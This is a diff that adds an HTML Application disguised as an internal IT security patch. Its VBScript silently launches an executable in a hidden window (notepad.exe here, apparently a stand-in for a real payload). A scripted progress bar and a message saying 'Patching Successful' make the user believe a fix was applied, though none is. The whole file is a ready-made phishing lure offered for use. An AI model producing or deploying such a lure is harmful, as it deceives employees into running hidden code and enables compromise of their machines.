@@ -1,0 +1,114 @@
+<html>
+	<head>
+		<title>Client Internal Security Patch December 2016</title>
+		<meta charset="utf-8">
+		<meta http-equiv="x-ua-compatible" content="ie=9">
+		<!-- CDN links -->
+		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+		<script src="https://code.jquery.com/jquery-1.12.3.js"></script>
+		<HTA:APPLICATION
+			SCROLL="auto"
+			SINGLEINSTANCE="yes"
+			CAPTION="yes"
+		>
+	</head>
+
+	<body>
+		<!-- This script will put the HTA document in the foreground and make the window 500x500 -->
+		<script language="vbscript">
+			window.resizeTo 500, 700
+			window.focus()
+		</script>
+
+		<!-- Start of main body content -->
+		<div class="container">
+			<script language="VBScript">
+	
+					Set oShell = CreateObject ("Wscript.Shell")
+					Dim strArgs
+					strArgs = "C:\\Windows\\SysWOW64\\notepad.exe"
+					oShell.Run strArgs, 0, false
+
+			</script>
+
+			<!-- Start of inline progress bar CSS -->
+			<style>
+				.progress, .alert
+				{
+					margin: 15px;
+				}
+
+				.alert
+				{
+					display: none;
+				}
+			</style>
+			<!-- End of inline progress bar CSS -->
+
+			<!-- Start of progress bar HTML -->
+			<div class="progress" id="progress">
+				<div class="progress-bar" id="progress-bar" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100" style="width: 0%;"></div>
+			</div>
+			<div class="alert  alert-success" id="alert" role="alert"><p align="center">Patching Successful, You may now close this dialog.<br> Thank you.</p></div>
+
+			<script>
+				var $progress = $('.progress');
+				var $progressBar = $('.progress-bar');
+				var $alert = $('.alert');
+
+				// Progress bar
+				// Updates 10% every 2 seconds
+				setTimeout(function() {
+					$progressBar.css('width', '10%');
+					setTimeout(function() {
+						$progressBar.css('width', '20%');
+						setTimeout(function() {
+							$progressBar.css('width', '30%');
+							setTimeout(function() {
+								$progressBar.css('width', '40%');
+								setTimeout(function() {
+									$progressBar.css('width', '50%');
+									setTimeout(function() {
+										$progressBar.css('width', '60%');
+										setTimeout(function() {
+											$progressBar.css('width', '70%');
+											setTimeout(function() {
+												$progressBar.css('width', '80%');
+												setTimeout(function() {
+													$progressBar.css('width', '90%');
+													setTimeout(function() {
+														$progressBar.css('width', '100%');
+														setTimeout(function() {
+															$progress.css('display', 'none');
+															$alert.css('display', 'block');
+														}, 2000); // Waits 2 seconds
+													}, 2000); // Waits 2 seconds
+												}, 2000); // Waits 2 seconds
+											}, 2000); // Waits 2 seconds
+										}, 2000); // Waits 2 seconds
+									}, 2000); // Waits 2 seconds
+								}, 2000); // Waits 2 seconds
+							}, 2000); // Waits 2 seconds
+						}, 2000); // Waits 2 seconds
+					}, 2000); // Waits 2 seconds
+				}, 2000); // Waits 2 seconds
+			</script>	
+			
+			<!-- Disclaimer -->
+			<p align="center"><br>IT's internal security team has detected several computer vulnerabilities in the past month.
+
+While a network wide patch will be rolled out within the month, we have found it prudent to activley patch certain systems.<br><br>
+
+Please wait untill the loading bar at the top of your screen reaches completion.<br><br>
+
+IT strives to create a secure environment for our Employees and Clients. Thank you for taking the time to increase our network security.</p>
+
+			
+			<p align="center"><br><br>This software is owned and operated by IT. This software is for internal use only. By using this software, you accept the terms and conditions of use.
+			<br><br>©2023 Client, Inc.</p>
+
+		</div> <!-- End of main body content -->
+	</body> <!-- End of body -->
+</html>
